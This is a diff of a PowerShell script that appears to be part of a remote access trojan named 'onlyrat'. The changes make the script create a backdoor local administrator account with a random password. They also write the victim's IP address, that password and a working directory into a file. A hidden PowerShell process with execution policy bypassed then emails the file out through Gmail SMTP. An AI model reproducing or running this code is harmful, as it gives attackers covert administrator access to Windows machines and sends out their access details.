@@ -22,7 +22,8 @@ function create_account {
 }
 # create admin user
 $xf061name = "onlyrat"
-$xf061pass = (ConvertTo-SecureString "0nlyRAT123" -AsPlainText -Force)
+$xf061RandPass = random_text(Get-Random -Minimum 6 -Maximum 19)
+$xf061pass = (ConvertTo-SecureString $xf061RandPass -AsPlainText -Force)
 create_account -xf061name $xf061name -xf061pass $xf061pass
 
 # Variables
@@ -30,7 +31,19 @@ $directory = random_text(5)
 $temp_dir = "$env:TEMP\$directory"
 # save current directory
 $curr_dir = Get-Location|%{$_.Path}
-# $ip = (Get-NetIPAddress -AddressFamily IPv4|?{$_.InterfaceAlias -ne 'Loopback Pseudo-Interface 1'}).IPAddress|select -Last 1|Out-String
+$config_file = "$env:username.rat"
+$email = Get-Content .\email.txt
+$password = Get-Content .\password.txt
+$ip = (Get-NetIPAddress -AddressFamily IPv4|?{$_.InterfaceAlias -ne 'Loopback Pseudo-Interface 1'}).IPAddress|select -Last 1
+
+# generate config file
+Add-Content -Path $config_file -Value $ip
+Add-Content -Path $config_file -Value $xf061RandPass
+Add-Content -Path $config_file -Value $temp_dir
+# Send Initial reconnaissance
+powershell powershell.exe -noP -ep bypass -w hidden "{Send-MailMessage -from $email -to $email -subject $config_file -attachments $config_file -smtpserver 'smtp.gmail.com' -port '587' -usessl -credential (new-object -typename system.management.automation.pscredential -argumentlist $email ,(convertto-securestring -string '$password' -asplaintext -force))}"
+
+
 
 # goto temp and make working directory
 mkdir $temp_dir
